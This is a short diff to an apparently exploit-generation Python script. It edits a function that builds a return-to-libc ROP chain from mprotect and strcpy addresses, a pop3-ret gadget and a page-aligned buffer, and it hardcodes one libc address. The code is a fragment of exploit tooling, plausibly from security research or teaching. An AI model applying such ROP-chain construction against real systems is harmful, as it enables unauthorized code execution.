@@ -142,8 +142,10 @@ def build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packe
     mprotect_offset = get_function_address(elffile, "mprotect")
     mprotect_addr = pack_value(libc_base_address + mprotect_offset)
 
-    strcpy_offset = get_function_address(elffile, "__strcpy_sse_2")
+    strcpy_offset = get_function_address(elffile, "strcpy")
     strcpy_addr = pack_value(0xb7e98a30)
+    #__strcpy_sse2 address needs to be hardcoded
+    #strcpy_addr = pack_value(libc_base_address + strcpy_offset)
 
     null_byte_location = pack_value(libc_base_address + find_null_byte(elffile))
 
@@ -152,8 +154,6 @@ def build_rop_chain_libc(elffile, libc_base_address, buf_address, buf_len, packe
 
     pop3_ret_offset = find_pop3_ret(disassembled_map)
     pop3_addr = pack_value(libc_base_address + pop3_ret_offset)
-    print hex(libc_base_address + pop3_ret_offset)
-    #pop3_addr = pack_value(0xb7efcaef)
 
     memory_start_address = ((buf_address >> 12) << 12)
     memory_length = 0x1000
